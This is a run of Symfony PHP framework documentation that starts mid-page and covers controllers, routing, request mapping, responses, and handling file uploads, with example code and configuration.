        class Hello
        {
            public function __invoke(string $name = 'World'): Response
            {
                return new Response(sprintf('Hello %s!', $name));
            }
        }

    .. code-block:: yaml

        # config/routes.yaml
        hello:
            path:       /hello/{name}
            controller: App\Controller\HelloController

    .. code-block:: xml

        <!-- config/routes.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <routes xmlns="http://symfony.com/schema/routing"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/routing
                https://symfony.com/schema/routing/routing-1.0.xsd">

            <route id="hello" path="/hello/{name}">
                <default key="_controller">App\Controller\HelloController</default>
            </route>

        </routes>

    .. code-block:: php

        use App\Controller\HelloController;

        // app/config/routing.php
        $collection->add('hello', new Route('/hello', [
            '_controller' => HelloController::class,
        ]));

Alternatives to base Controller Methods
---------------------------------------

When using a controller defined as a service, you can still extend the
:ref:`AbstractController base controller <the-base-controller-class-services>`
and use its shortcuts. But, you don't need to! You can choose to extend *nothing*,
and use dependency injection to access different services.

The base `Controller class source code`_ is a great way to see how to accomplish
common tasks. For example, ``$this->render()`` is usually used to render a Twig
template and return a Response. But, you can also do this directly:

In a controller that's defined as a service, you can instead inject the ``twig``
service and use it directly::

    // src/Controller/HelloController.php
    namespace App\Controller;

    use Symfony\Component\HttpFoundation\Response;
    use Twig\Environment;

    class HelloController
    {
        public function __construct(
            private Environment $twig,
        ) {
        }

        public function index(string $name): Response
        {
            $content = $this->twig->render(
                'hello/index.html.twig',
                ['name' => $name]
            );

            return new Response($content);
        }
    }

You can also use a special :ref:`action-based dependency injection <controller-accessing-services>`
to receive services as arguments to your controller action methods.

Base Controller Methods and Their Service Replacements
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The best way to see how to replace base ``Controller`` convenience methods is to
look at the `AbstractController`_ class that holds its logic.

If you want to know what type-hints to use for each service, see the
``getSubscribedServices()`` method in `AbstractController`_.

.. _`Controller class source code`: https://github.com/symfony/symfony/blob/master/src/Symfony/Bundle/FrameworkBundle/Controller/AbstractController.php
.. _`AbstractController`: https://github.com/symfony/symfony/blob/master/src/Symfony/Bundle/FrameworkBundle/Controller/AbstractController.php
.. _`ADR pattern`: https://en.wikipedia.org/wiki/Action%E2%80%93domain%E2%80%93responder
Controller
==========

A controller is a PHP function you create that reads information from the
``Request`` object and creates and returns a ``Response`` object. The response could
be an HTML page, JSON, XML, a file download, a redirect, a 404 error or anything
else. The controller runs whatever arbitrary logic *your application* needs
to render the content of a page.

.. tip::

    If you haven't already created your first working page, check out
    :doc:`/page_creation` and then come back!

A Basic Controller
------------------

While a controller can be any PHP callable (function, method on an object,
or a ``Closure``), a controller is usually a method inside a controller
class::

    // src/Controller/LuckyController.php
    namespace App\Controller;

    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\Routing\Attribute\Route;

    class LuckyController
    {
        #[Route('/lucky/number/{max}', name: 'app_lucky_number')]
        public function number(int $max): Response
        {
            $number = random_int(0, $max);

            return new Response(
                '<html><body>Lucky number: '.$number.'</body></html>'
            );
        }
    }

The controller is the ``number()`` method, which lives inside the
controller class ``LuckyController``.

This controller is pretty straightforward:

* *line 2*: Symfony takes advantage of PHP's namespace functionality to
  namespace the entire controller class.

* *line 4*: Symfony again takes advantage of PHP's namespace functionality:
  the ``use`` keyword imports the ``Response`` class, which the controller
  must return.

* *line 7*: The class can technically be called anything, but it's suffixed
  with ``Controller`` by convention.

* *line 10*: The action method is allowed to have a ``$max`` argument thanks to the
  ``{max}`` :doc:`wildcard in the route </routing>`.

* *line 14*: The controller creates and returns a ``Response`` object.

Mapping a URL to a Controller
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

In order to *view* the result of this controller, you need to map a URL to it via
a route. This was done above with the ``#[Route('/lucky/number/{max}')]``
:ref:`route attribute <attribute-routes>`.

To see your page, go to this URL in your browser: http://localhost:8000/lucky/number/100

For more information on routing, see :doc:`/routing`.

.. _the-base-controller-class-services:
.. _the-base-controller-classes-services:

The Base Controller Class & Services
------------------------------------

To aid development, Symfony comes with an optional base controller class called
:class:`Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController`.
It can be extended to gain access to helper methods.

Add the ``use`` statement atop your controller class and then modify
``LuckyController`` to extend it:

.. code-block:: diff

      // src/Controller/LuckyController.php
      namespace App\Controller;

    + use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;

    - class LuckyController
    + class LuckyController extends AbstractController
      {
          // ...
      }

That's it! You now have access to methods like :ref:`$this->render() <controller-rendering-templates>`
and many others that you'll learn about next.

Generating URLs
~~~~~~~~~~~~~~~

The :method:`Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController::generateUrl`
method is just a helper method that generates the URL for a given route::

    $url = $this->generateUrl('app_lucky_number', ['max' => 10]);

.. _controller-redirect:

Redirecting
~~~~~~~~~~~

If you want to redirect the user to another page, use the ``redirectToRoute()``
and ``redirect()`` methods::

    use Symfony\Component\HttpFoundation\RedirectResponse;
    use Symfony\Component\HttpFoundation\Response;

    // ...
    public function index(): RedirectResponse
    {
        // redirects to the "homepage" route
        return $this->redirectToRoute('homepage');

        // redirectToRoute is a shortcut for:
        // return new RedirectResponse($this->generateUrl('homepage'));

        // does a permanent HTTP 301 redirect
        return $this->redirectToRoute('homepage', [], 301);
        // if you prefer, you can use PHP constants instead of hardcoded numbers
        return $this->redirectToRoute('homepage', [], Response::HTTP_MOVED_PERMANENTLY);

        // redirect to a route with parameters
        return $this->redirectToRoute('app_lucky_number', ['max' => 10]);

        // redirects to a route and maintains the original query string parameters
        return $this->redirectToRoute('blog_show', $request->query->all());

        // redirects to the current route (e.g. for Post/Redirect/Get pattern):
        return $this->redirectToRoute($request->attributes->get('_route'));

        // redirects externally
        return $this->redirect('http://symfony.com/doc');
    }

.. danger::

    The ``redirect()`` method does not check its destination in any way. If you
    redirect to a URL provided by end-users, your application may be open
    to the `unvalidated redirects security vulnerability`_.

.. _controller-rendering-templates:

Rendering Templates
~~~~~~~~~~~~~~~~~~~

If you're serving HTML, you'll want to render a template. The ``render()``
method renders a template **and** puts that content into a ``Response``
object for you::

    // renders templates/lucky/number.html.twig
    return $this->render('lucky/number.html.twig', ['number' => $number]);

Templating and Twig are explained more in the
:doc:`Creating and Using Templates article </templates>`.

.. _controller-accessing-services:
.. _accessing-other-services:

Fetching Services
~~~~~~~~~~~~~~~~~

Symfony comes *packed* with a lot of useful classes and functionalities, called :doc:`services </service_container>`.
These are used for rendering templates, sending emails, querying the database and
any other "work" you can think of.

If you need a service in a controller, type-hint an argument with its class
(or interface) name. Symfony will automatically pass you the service you need::

    use Psr\Log\LoggerInterface;
    use Symfony\Component\HttpFoundation\Response;
    // ...

    #[Route('/lucky/number/{max}')]
    public function number(int $max, LoggerInterface $logger): Response
    {
        $logger->info('We are logging!');
        // ...
    }

Awesome!

What other services can you type-hint? To see them, use the ``debug:autowiring`` console
command:

.. code-block:: terminal

    $ php bin/console debug:autowiring

.. tip::

    If you need control over the *exact* value of an argument, or require a parameter,
    you can use the ``#[Autowire]`` attribute::

        // ...
        use Psr\Log\LoggerInterface;
        use Symfony\Component\DependencyInjection\Attribute\Autowire;
        use Symfony\Component\HttpFoundation\Response;

        class LuckyController extends AbstractController
        {
            public function number(
                int $max,

                // inject a specific logger service
                #[Autowire(service: 'monolog.logger.request')]
                LoggerInterface $logger,

                // or inject parameter values
                #[Autowire('%kernel.project_dir%')]
                string $projectDir
            ): Response
            {
                $logger->info('We are logging!');
                // ...
            }
        }

    You can read more about this attribute in :ref:`autowire-attribute`.

Like with all services, you can also use regular
:ref:`constructor injection <services-constructor-injection>` in your
controllers.

For more information about services, see the :doc:`/service_container` article.

Generating Controllers
----------------------

To save time, you can install `Symfony Maker`_ and tell Symfony to generate a
new controller class:

.. code-block:: terminal

    $ php bin/console make:controller BrandNewController

    created: src/Controller/BrandNewController.php
    created: templates/brandnew/index.html.twig

If you want to generate an entire CRUD from a Doctrine :doc:`entity </doctrine>`,
use:

.. code-block:: terminal

    $ php bin/console make:crud Product

    created: src/Controller/ProductController.php
    created: src/Form/ProductType.php
    created: templates/product/_delete_form.html.twig
    created: templates/product/_form.html.twig
    created: templates/product/edit.html.twig
    created: templates/product/index.html.twig
    created: templates/product/new.html.twig
    created: templates/product/show.html.twig

Managing Errors and 404 Pages
-----------------------------

When things are not found, you should return a 404 response. To do this, throw a
special type of exception::

    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\HttpKernel\Exception\NotFoundHttpException;

    // ...
    public function index(): Response
    {
        // retrieve the object from database
        $product = ...;
        if (!$product) {
            throw $this->createNotFoundException('The product does not exist');

            // the above is just a shortcut for:
            // throw new NotFoundHttpException('The product does not exist');
        }

        return $this->render(/* ... */);
    }

The :method:`Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController::createNotFoundException`
method is just a shortcut to create a special
:class:`Symfony\\Component\\HttpKernel\\Exception\\NotFoundHttpException`
object, which ultimately triggers a 404 HTTP response inside Symfony.

If you throw an exception that extends or is an instance of
:class:`Symfony\\Component\\HttpKernel\\Exception\\HttpException`, Symfony will
use the appropriate HTTP status code. Otherwise, the response will have a 500
HTTP status code::

    // this exception ultimately generates a 500 status error
    throw new \Exception('Something went wrong!');

In every case, an error page is shown to the end user and a full debug
error page is shown to the developer (i.e. when you're in "Debug" mode - see
:ref:`page-creation-environments`).

To customize the error page that's shown to the user, see the
:doc:`/controller/error_pages` article.

.. _controller-request-argument:

The Request object as a Controller Argument
-------------------------------------------

What if you need to read query parameters, grab a request header or get access
to an uploaded file? That information is stored in Symfony's ``Request``
object. To access it in your controller, add it as an argument and
**type-hint it with the Request class**::

    use Symfony\Component\HttpFoundation\Request;
    use Symfony\Component\HttpFoundation\Response;
    // ...

    public function index(Request $request): Response
    {
        $page = $request->query->get('page', 1);

        // ...
    }

:ref:`Keep reading <request-object-info>` for more information about using the
Request object.

.. _controller_map-request:

Automatic Mapping Of The Request
--------------------------------

It is possible to automatically map request's payload and/or query parameters to
your controller's action arguments with attributes.

Mapping Query Parameters Individually
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Let's say a user sends you a request with the following query string:
``https://example.com/dashboard?firstName=John&lastName=Smith&age=27``.
Thanks to the :class:`Symfony\\Component\\HttpKernel\\Attribute\\MapQueryParameter`
attribute, arguments of your controller's action can be automatically fulfilled::

    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\HttpKernel\Attribute\MapQueryParameter;

    // ...

    public function dashboard(
        #[MapQueryParameter] string $firstName,
        #[MapQueryParameter] string $lastName,
        #[MapQueryParameter] int $age,
    ): Response
    {
        // ...
    }

``#[MapQueryParameter]`` can take an optional argument called ``filter``. You can use the
`Validate Filters`_ constants defined in PHP::

    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\HttpKernel\Attribute\MapQueryParameter;

    // ...

    public function dashboard(
        #[MapQueryParameter(filter: \FILTER_VALIDATE_REGEXP, options: ['regexp' => '/^\w+$/'])] string $firstName,
        #[MapQueryParameter] string $lastName,
        #[MapQueryParameter(filter: \FILTER_VALIDATE_INT)] int $age,
    ): Response
    {
        // ...
    }

.. _controller-mapping-query-string:

Mapping The Whole Query String
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Another possibility is to map the entire query string into an object that will hold
available query parameters. Let's say you declare the following DTO with its
optional validation constraints::

    namespace App\Model;

    use Symfony\Component\Validator\Constraints as Assert;

    class UserDTO
    {
        public function __construct(
            #[Assert\NotBlank]
            public string $firstName,

            #[Assert\NotBlank]
            public string $lastName,

            #[Assert\GreaterThan(18)]
            public int $age,
        ) {
        }
    }

You can then use the :class:`Symfony\\Component\\HttpKernel\\Attribute\\MapQueryString`
attribute in your controller::

    use App\Model\UserDto;
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\HttpKernel\Attribute\MapQueryString;

    // ...

    public function dashboard(
        #[MapQueryString] UserDTO $userDto
    ): Response
    {
        // ...
    }

You can customize the validation groups used during the mapping and also the
HTTP status to return if the validation fails::

    use Symfony\Component\HttpFoundation\Response;

    // ...

    public function dashboard(
        #[MapQueryString(
            validationGroups: ['strict', 'edit'],
            validationFailedStatusCode: Response::HTTP_UNPROCESSABLE_ENTITY
        )] UserDTO $userDto
    ): Response
    {
        // ...
    }

The default status code returned if the validation fails is 404.

If you need a valid DTO even when the request query string is empty, set a
default value for your controller arguments::

    use App\Model\UserDto;
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\HttpKernel\Attribute\MapQueryString;

    // ...

    public function dashboard(
        #[MapQueryString] UserDTO $userDto = new UserDTO()
    ): Response
    {
        // ...
    }

.. _controller-mapping-request-payload:

Mapping Request Payload
~~~~~~~~~~~~~~~~~~~~~~~

When creating an API and dealing with other HTTP methods than ``GET`` (like
``POST`` or ``PUT``), user's data are not stored in the query string
but directly in the request payload, like this:

.. code-block:: json

    {
        "firstName": "John",
        "lastName": "Smith",
        "age": 28
    }

In this case, it is also possible to directly map this payload to your DTO by
using the :class:`Symfony\\Component\\HttpKernel\\Attribute\\MapRequestPayload`
attribute::

    use App\Model\UserDto;
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\HttpKernel\Attribute\MapRequestPayload;

    // ...

    public function dashboard(
        #[MapRequestPayload] UserDTO $userDto
    ): Response
    {
        // ...
    }

This attribute allows you to customize the serialization context as well
as the class responsible of doing the mapping between the request and
your DTO::

    public function dashboard(
        #[MapRequestPayload(
            serializationContext: ['...'],
            resolver: App\Resolver\UserDtoResolver
        )]
        UserDTO $userDto
    ): Response
    {
        // ...
    }

You can also customize the validation groups used, the status code to return if
the validation fails as well as supported payload formats::

    use Symfony\Component\HttpFoundation\Response;

    // ...

    public function dashboard(
        #[MapRequestPayload(
            acceptFormat: 'json',
            validationGroups: ['strict', 'read'],
            validationFailedStatusCode: Response::HTTP_NOT_FOUND
        )] UserDTO $userDto
    ): Response
    {
        // ...
    }

The default status code returned if the validation fails is 422.

.. tip::

    If you build a JSON API, make sure to declare your route as using the JSON
    :ref:`format <routing-format-parameter>`. This will make the error handling
    output a JSON response in case of validation errors, rather than an HTML page::

        #[Route('/dashboard', name: 'dashboard', format: 'json')]

Make sure to install `phpstan/phpdoc-parser`_ and `phpdocumentor/type-resolver`_
if you want to map a nested array of specific DTOs::

    public function dashboard(
        #[MapRequestPayload()] EmployeesDTO $employeesDto
    ): Response
    {
        // ...
    }

    final class EmployeesDTO
    {
        /**
         * @param UserDTO[] $users
         */
        public function __construct(
            public readonly array $users = []
        ) {}
    }

Instead of returning an array of DTO objects, you can tell Symfony to transform
each DTO object into an array and return something like this:

.. code-block:: json

    [
        {
            "firstName": "John",
            "lastName": "Smith",
            "age": 28
        },
        {
            "firstName": "Jane",
            "lastName": "Doe",
            "age": 30
        }
    ]

To do so, map the parameter as an array and configure the type of each element
using the ``type`` option of the attribute::

    public function dashboard(
        #[MapRequestPayload(type: UserDTO::class)] array $users
    ): Response
    {
        // ...
    }

.. versionadded:: 7.1

    The ``type`` option of ``#[MapRequestPayload]`` was introduced in Symfony 7.1.

Managing the Session
--------------------

You can store special messages, called "flash" messages, on the user's session.
By design, flash messages are meant to be used exactly once: they vanish from
the session automatically as soon as you retrieve them. This feature makes
"flash" messages particularly great for storing user notifications.

For example, imagine you're processing a :doc:`form </forms>` submission::

.. configuration-block::

    .. code-block:: php-symfony

        use Symfony\Component\HttpFoundation\Request;
        use Symfony\Component\HttpFoundation\Response;
        // ...

        public function update(Request $request): Response
        {
            // ...

            if ($form->isSubmitted() && $form->isValid()) {
                // do some sort of processing

                $this->addFlash(
                    'notice',
                    'Your changes were saved!'
                );
                // $this->addFlash() is equivalent to $request->getSession()->getFlashBag()->add()

                return $this->redirectToRoute(/* ... */);
            }

            return $this->render(/* ... */);
        }

:ref:`Reading <session-intro>` for more information about using Sessions.

.. _request-object-info:

The Request and Response Object
-------------------------------

As mentioned :ref:`earlier <controller-request-argument>`, Symfony will
pass the ``Request`` object to any controller argument that is type-hinted with
the ``Request`` class::

    use Symfony\Component\HttpFoundation\Request;
    use Symfony\Component\HttpFoundation\Response;

    public function index(Request $request): Response
    {
        $request->isXmlHttpRequest(); // is it an Ajax request?

        $request->getPreferredLanguage(['en', 'fr']);

        // retrieves GET and POST variables respectively
        $request->query->get('page');
        $request->getPayload()->get('page');

        // retrieves SERVER variables
        $request->server->get('HTTP_HOST');

        // retrieves an instance of UploadedFile identified by foo
        $request->files->get('foo');

        // retrieves a COOKIE value
        $request->cookies->get('PHPSESSID');

        // retrieves an HTTP request header, with normalized, lowercase keys
        $request->headers->get('host');
        $request->headers->get('content-type');
    }

The ``Request`` class has several public properties and methods that return any
information you need about the request.

Like the ``Request``, the ``Response`` object has a public ``headers`` property.
This object is of the type :class:`Symfony\\Component\\HttpFoundation\\ResponseHeaderBag`
and provides methods for getting and setting response headers. The header names are
normalized. As a result, the name ``Content-Type`` is equivalent to
the name ``content-type`` or ``content_type``.

In Symfony, a controller is required to return a ``Response`` object::

    use Symfony\Component\HttpFoundation\Response;

    // creates a simple Response with a 200 status code (the default)
    $response = new Response('Hello '.$name, Response::HTTP_OK);

    // creates a CSS-response with a 200 status code
    $response = new Response('<style> ... </style>');
    $response->headers->set('Content-Type', 'text/css');

To facilitate this, different response objects are included to address different
response types.  Some of these are mentioned below. To learn more about the
``Request`` and ``Response`` (and different ``Response`` classes), see the
:ref:`HttpFoundation component documentation <component-http-foundation-request>`.

Accessing Configuration Values
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

To get the value of any :ref:`configuration parameter <configuration-parameters>`
from a controller, use the ``getParameter()`` helper method::

    // ...
    public function index(): Response
    {
        $contentsDir = $this->getParameter('kernel.project_dir').'/contents';
        // ...
    }

Returning JSON Response
~~~~~~~~~~~~~~~~~~~~~~~

To return JSON from a controller, use the ``json()`` helper method. This returns a
``JsonResponse`` object that encodes the data automatically::

    use Symfony\Component\HttpFoundation\JsonResponse;
    // ...

    public function index(): JsonResponse
    {
        // returns '{"username":"jane.doe"}' and sets the proper Content-Type header
        return $this->json(['username' => 'jane.doe']);

        // the shortcut defines three optional arguments
        // return $this->json($data, $status = 200, $headers = [], $context = []);
    }

If the :doc:`serializer service </serializer>` is enabled in your
application, it will be used to serialize the data to JSON. Otherwise,
the :phpfunction:`json_encode` function is used.

Streaming File Responses
~~~~~~~~~~~~~~~~~~~~~~~~

You can use the :method:`Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController::file`
helper to serve a file from inside a controller::

    use Symfony\Component\HttpFoundation\BinaryFileResponse;
    // ...

    public function download(): BinaryFileResponse
    {
        // send the file contents and force the browser to download it
        return $this->file('/path/to/some_file.pdf');
    }

The ``file()`` helper provides some arguments to configure its behavior::

    use Symfony\Component\HttpFoundation\File\File;
    use Symfony\Component\HttpFoundation\ResponseHeaderBag;
    // ...

    public function download(): BinaryFileResponse
    {
        // load the file from the filesystem
        $file = new File('/path/to/some_file.pdf');

        return $this->file($file);

        // rename the downloaded file
        return $this->file($file, 'custom_name.pdf');

        // display the file contents in the browser instead of downloading it
        return $this->file('invoice_3241.pdf', 'my_invoice.pdf', ResponseHeaderBag::DISPOSITION_INLINE);
    }

Sending Early Hints
~~~~~~~~~~~~~~~~~~~

`Early hints`_ tell the browser to start downloading some assets even before the
application sends the response content. This improves perceived performance
because the browser can prefetch resources that will be needed once the full
response is finally sent. These resources are commonly Javascript or CSS files,
but they can be any type of resource.

.. note::

    In order to work, the `SAPI`_ you're using must support this feature, like
    `FrankenPHP`_.

You can send early hints from your controller action thanks to the
:method:`Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController::sendEarlyHints`
method::

    namespace App\Controller;

    use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\Routing\Attribute\Route;
    use Symfony\Component\WebLink\Link;

    class HomepageController extends AbstractController
    {
        #[Route("/", name: "homepage")]
        public function index(): Response
        {
            $response = $this->sendEarlyHints([
                new Link(rel: 'preconnect', href: 'https://fonts.google.com'),
                (new Link(href: '/style.css'))->withAttribute('as', 'stylesheet'),
                (new Link(href: '/script.js'))->withAttribute('as', 'script'),
            ]);

            // prepare the contents of the response...

            return $this->render('homepage/index.html.twig', response: $response);
        }
    }

Technically, Early Hints are an informational HTTP response with the status code
``103``. The ``sendEarlyHints()`` method creates a ``Response`` object with that
status code and sends its headers immediately.

This way, browsers can start downloading the assets immediately; like the
``style.css`` and ``script.js`` files in the above example. The
``sendEarlyHints()`` method also returns the ``Response`` object, which you
must use to create the full response sent from the controller action.

Final Thoughts
--------------

In Symfony, a controller is usually a class method which is used to accept
requests, and return a ``Response`` object. When mapped with a URL, a controller
becomes accessible and its response can be viewed.

To facilitate the development of controllers, Symfony provides an
``AbstractController``.  It can be used to extend the controller class allowing
access to some frequently used utilities such as ``render()`` and
``redirectToRoute()``. The ``AbstractController`` also provides the
``createNotFoundException()`` utility which is used to return a page not found
response.

In other articles, you'll learn how to use specific services from inside your controller
that will help you persist and fetch objects from a database, process form submissions,
handle caching and more.

Keep Going!
-----------

Next, learn all about :doc:`rendering templates with Twig </templates>`.

Learn more about Controllers
----------------------------

.. toctree::
    :maxdepth: 1
    :glob:

    controller/*

.. _`Symfony Maker`: https://symfony.com/doc/current/bundles/SymfonyMakerBundle/index.html
.. _`unvalidated redirects security vulnerability`: https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html
.. _`Early hints`: https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/103
.. _`SAPI`: https://www.php.net/manual/en/function.php-sapi-name.php
.. _`FrankenPHP`: https://frankenphp.dev
.. _`Validate Filters`: https://www.php.net/manual/en/filter.filters.validate.php
.. _`phpstan/phpdoc-parser`: https://packagist.org/packages/phpstan/phpdoc-parser
.. _`phpdocumentor/type-resolver`: https://packagist.org/packages/phpdocumentor/type-resolver
How to Upload Files
===================

.. note::

    Instead of handling file uploading yourself, you may consider using the
    `VichUploaderBundle`_ community bundle. This bundle provides all the common
    operations (such as file renaming, saving and deleting) and it's tightly
    integrated with Doctrine ORM, MongoDB ODM, PHPCR ODM and Propel.

Imagine that you have a ``Product`` entity in your application and you want to
add a PDF brochure for each product. To do so, add a new property called
``brochureFilename`` in the ``Product`` entity::

    // src/Entity/Product.php
    namespace App\Entity;

    use Doctrine\ORM\Mapping as ORM;

    class Product
    {
        // ...

        #[ORM\Column(type: 'string')]
        private string $brochureFilename;

        public function getBrochureFilename(): string
        {
            return $this->brochureFilename;
        }

        public function setBrochureFilename(string $brochureFilename): self
        {
            $this->brochureFilename = $brochureFilename;

            return $this;
        }
    }

Note that the type of the ``brochureFilename`` column is ``string`` instead of
``binary`` or ``blob`` because it only stores the PDF file name instead of the
file contents.

The next step is to add a new field to the form that manages the ``Product``
entity. This must be a ``FileType`` field so the browsers can display the file
upload widget. The trick to make it work is to add the form field as "unmapped",
so Symfony doesn't try to get/set its value from the related entity::

    // src/Form/ProductType.php
    namespace App\Form;

    use App\Entity\Product;
    use Symfony\Component\Form\AbstractType;
    use Symfony\Component\Form\Extension\Core\Type\FileType;
    use Symfony\Component\Form\FormBuilderInterface;
    use Symfony\Component\OptionsResolver\OptionsResolver;
    use Symfony\Component\Validator\Constraints\File;

    class ProductType extends AbstractType
    {
        public function buildForm(FormBuilderInterface $builder, array $options): void
        {
            $builder
                // ...
                ->add('brochure', FileType::class, [
                    'label' => 'Brochure (PDF file)',

                    // unmapped means that this field is not associated to any entity property
                    'mapped' => false,

                    // make it optional so you don't have to re-upload the PDF file
                    // every time you edit the Product details
                    'required' => false,

                    // unmapped fields can't define their validation using attributes
                    // in the associated entity, so you can use the PHP constraint classes
                    'constraints' => [
                        new File([
                            'maxSize' => '1024k',
                            'mimeTypes' => [
                                'application/pdf',
                                'application/x-pdf',
                            ],
                            'mimeTypesMessage' => 'Please upload a valid PDF document',
                        ])
                    ],
                ])
                // ...
            ;
        }

        public function configureOptions(OptionsResolver $resolver): void
        {
            $resolver->setDefaults([
                'data_class' => Product::class,
            ]);
        }
    }

Now, update the template that renders the form to display the new ``brochure``
field (the exact template code to add depends on the method used by your application
to :doc:`customize form rendering </form/form_customization>`):

.. code-block:: html+twig

    {# templates/product/new.html.twig #}
    <h1>Adding a new product</h1>

    {{ form_start(form) }}
        {# ... #}

        {{ form_row(form.brochure) }}
    {{ form_end(form) }}

Finally, you need to update the code of the controller that handles the form::

    // src/Controller/ProductController.php
    namespace App\Controller;

    use App\Entity\Product;
    use App\Form\ProductType;
    use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
    use Symfony\Component\HttpFoundation\File\Exception\FileException;
    use Symfony\Component\HttpFoundation\File\UploadedFile;
    use Symfony\Component\HttpFoundation\Request;
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\Routing\Attribute\Route;
    use Symfony\Component\String\Slugger\SluggerInterface;

    class ProductController extends AbstractController
    {
        #[Route('/product/new', name: 'app_product_new')]
        public function new(Request $request, SluggerInterface $slugger): Response
        {
            $product = new Product();
            $form = $this->createForm(ProductType::class, $product);
            $form->handleRequest($request);

            if ($form->isSubmitted() && $form->isValid()) {
                /** @var UploadedFile $brochureFile */
                $brochureFile = $form->get('brochure')->getData();

                // this condition is needed because the 'brochure' field is not required
                // so the PDF file must be processed only when a file is uploaded
                if ($brochureFile) {
                    $originalFilename = pathinfo($brochureFile->getClientOriginalName(), PATHINFO_FILENAME);
                    // this is needed to safely include the file name as part of the URL
                    $safeFilename = $slugger->slug($originalFilename);
                    $newFilename = $safeFilename.'-'.uniqid().'.'.$brochureFile->guessExtension();

                    // Move the file to the directory where brochures are stored
                    try {
                        $brochureFile->move(
                            $this->getParameter('brochures_directory'),
                            $newFilename
                        );
                    } catch (FileException $e) {
                        // ... handle exception if something happens during file upload
                    }

                    // updates the 'brochureFilename' property to store the PDF file name
                    // instead of its contents
                    $product->setBrochureFilename($newFilename);
                }

                // ... persist the $product variable or any other work

                return $this->redirectToRoute('app_product_list');
            }

            return $this->render('product/new.html.twig', [
                'form' => $form,
            ]);
        }
    }

Now, create the ``brochures_directory`` parameter that was used in the
controller to specify the directory in which the brochures should be stored:

.. code-block:: yaml

    # config/services.yaml

    # ...
    parameters:
        brochures_directory: '%kernel.project_dir%/public/uploads/brochures'

There are some important things to consider in the code of the above controller:

#. In Symfony applications, uploaded files are objects of the
   :class:`Symfony\\Component\\HttpFoundation\\File\\UploadedFile` class. This class
   provides methods for the most common operations when dealing with uploaded files;
#. A well-known security best practice is to never trust the input provided by
   users. This also applies to the files uploaded by your visitors. The ``UploadedFile``
   class provides methods to get the original file extension
   (:method:`Symfony\\Component\\HttpFoundation\\File\\UploadedFile::getClientOriginalExtension`),
   the original file size (:method:`Symfony\\Component\\HttpFoundation\\File\\UploadedFile::getSize`),
   the original file name (:method:`Symfony\\Component\\HttpFoundation\\File\\UploadedFile::getClientOriginalName`)
   and the original file path (:method:`Symfony\\Component\\HttpFoundation\\File\\UploadedFile::getClientOriginalPath`).
   However, they are considered *not safe* because a malicious user could tamper
   that information. That's why it's always better to generate a unique name and
   use the :method:`Symfony\\Component\\HttpFoundation\\File\\UploadedFile::guessExtension`
   method to let Symfony guess the right extension according to the file MIME type;

.. note::

    If a directory was uploaded, ``getClientOriginalPath()`` will contain
    the **webkitRelativePath** as provided by the browser. Otherwise this
    value will be identical to ``getClientOriginalName()``.

.. versionadded:: 7.1

    The ``getClientOriginalPath()`` method was introduced in Symfony 7.1.

You can use the following code to link to the PDF brochure of a product:

.. code-block:: html+twig

    <a href="{{ asset('uploads/brochures/' ~ product.brochureFilename) }}">View brochure (PDF)</a>

.. tip::

    When creating a form to edit an already persisted item, the file form type
    still expects a :class:`Symfony\\Component\\HttpFoundation\\File\\File`
    instance. As the persisted entity now contains only the relative file path,
    you first have to concatenate the configured upload path with the stored
    filename and create a new ``File`` class::

        use Symfony\Component\HttpFoundation\File\File;
        // ...

        $product->setBrochureFilename(
            new File($this->getParameter('brochures_directory').'/'.$product->getBrochureFilename())
        );

Creating an Uploader Service
----------------------------

To avoid logic in controllers, making them big, you can extract the upload
logic to a separate service::

    // src/Service/FileUploader.php
    namespace App\Service;

    use Symfony\Component\HttpFoundation\File\Exception\FileException;
    use Symfony\Component\HttpFoundation\File\UploadedFile;
    use Symfony\Component\String\Slugger\SluggerInterface;

    class FileUploader
    {
        public function __construct(
            private string $targetDirectory,
            private SluggerInterface $slugger,
        ) {
        }

        public function upload(UploadedFile $file): string
        {
            $originalFilename = pathinfo($file->getClientOriginalName(), PATHINFO_FILENAME);
            $safeFilename = $this->slugger->slug($originalFilename);
            $fileName = $safeFilename.'-'.uniqid().'.'.$file->guessExtension();

            try {
                $file->move($this->getTargetDirectory(), $fileName);
            } catch (FileException $e) {
                // ... handle exception if something happens during file upload
            }

            return $fileName;
        }

        public function getTargetDirectory(): string
        {
            return $this->targetDirectory;
        }
    }

.. tip::

    In addition to the generic :class:`Symfony\\Component\\HttpFoundation\\File\\Exception\\FileException`
    class there are other exception classes to handle failed file uploads:
    :class:`Symfony\\Component\\HttpFoundation\\File\\Exception\\CannotWriteFileException`,
    :class:`Symfony\\Component\\HttpFoundation\\File\\Exception\\ExtensionFileException`,
    :class:`Symfony\\Component\\HttpFoundation\\File\\Exception\\FormSizeFileException`,
    :class:`Symfony\\Component\\HttpFoundation\\File\\Exception\\IniSizeFileException`,
    :class:`Symfony\\Component\\HttpFoundation\\File\\Exception\\NoFileException`,
    :class:`Symfony\\Component\\HttpFoundation\\File\\Exception\\NoTmpDirFileException`,
    and :class:`Symfony\\Component\\HttpFoundation\\File\\Exception\\PartialFileException`.

